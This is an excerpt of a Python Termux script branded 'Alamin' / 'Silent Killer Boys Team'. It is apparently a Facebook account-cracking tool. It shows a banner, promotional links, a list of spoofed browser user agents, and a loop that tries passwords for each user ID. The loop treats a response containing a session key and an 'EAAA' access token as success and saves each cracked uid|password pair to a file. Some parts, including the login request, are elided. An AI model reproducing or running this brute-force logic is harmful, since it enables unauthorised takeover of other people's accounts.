...
def logo():
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m ღ﹏𝐀𝐥𝐚𝐦𝐢𝐧﹏ღ\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :5.0\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ღ﹏𝐀𝐥𝐚𝐦𝐢𝐧﹏ღ \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/atalamin \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./Termux.User.Tera.Next.Pappa\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/atalamin/Devilalamin/blob/main/Approved.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/Termux.User.Tera.Next.Pappa")
...
def notice():
	...
	os.system("xdg-open https://www.facebook.com/Termux.User.Tera.Next.Pappa")
	subprocess.check_output(["am", "start", "https://www.facebook.com/Termux.User.Tera.Next.Pappa"])
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : 𝐒𝐢𝐥𝐞𝐧𝐭 𝐊𝐢𝐥𝐥𝐞𝐫 𝐁𝐨𝐲𝐬 𝐓𝐞𝐚𝐦🥰 \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Page : https://www.facebook.com/profile.php?id=100089179565225\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100089179565225"])
		print("───────────────────────────────────────────────────────× ")
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
 ...
 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36'
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		sys.stdout.write(
			"\r [+]%s> /[𝐀𝐋𝐀𝐌𝐈𝐍😍]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-ღ﹏𝐒𝐊𝐁﹏ღ]%s | %s\033[1;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥-ღ﹏𝐒𝐊𝐁﹏ღ.txt","a").write(" %s|%s\n"%(uid, pw))
				break
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/Termux.User.Tera.Next.Pappa")
		print(" [*] Instagram : https://instagram.com/ ")
		print(" [*] YouTube   : https://youtube.com/@bdfollowbazar ")
